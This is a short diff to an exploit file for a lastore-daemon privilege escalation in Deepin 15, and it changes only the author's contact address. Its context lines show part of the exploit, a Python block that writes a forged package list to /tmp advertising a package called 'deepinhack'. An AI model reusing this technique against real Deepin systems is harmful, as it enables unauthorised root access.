@@ -3,7 +3,7 @@
 
 # Exploit Title: Lastore-daemon in Deepin 15 results in privilege escalation
 # Date: 20160208
-# Exploit Author: King's Way <root#kings-way.info>
+# Exploit Author: King's Way <io[AT]stdio.io>
 # Vendor Homepage: http://www.deepin.org
 # Software Link: http://cdimage.linuxdeepin.com/releases/15.1/deepin-15.1-amd64.iso
 # Version: Deepin 15 & 15.1
@@ -2612,7 +2612,7 @@ if __name__ == '__main__':
     lists = open("/tmp/lists/packages.deepin.com_deepin_dists_unstable_main_binary-amd64_Packages", "w")
     lists.write("Package: deepinhack\n"
             "Version: 0.0.1\n"
-            "Maintainer: King's Way <root#kings-way.info>\n"
+            "Maintainer: King's Way <io[AT]stdio.io>\n"
             "Architecture: amd64\n"
             "Size: 51122\n"
             "SHA256: 3c135fb86c3a018060b55e748ad7e12b484433f1743b704ffc14e1a32f46ad12\n"
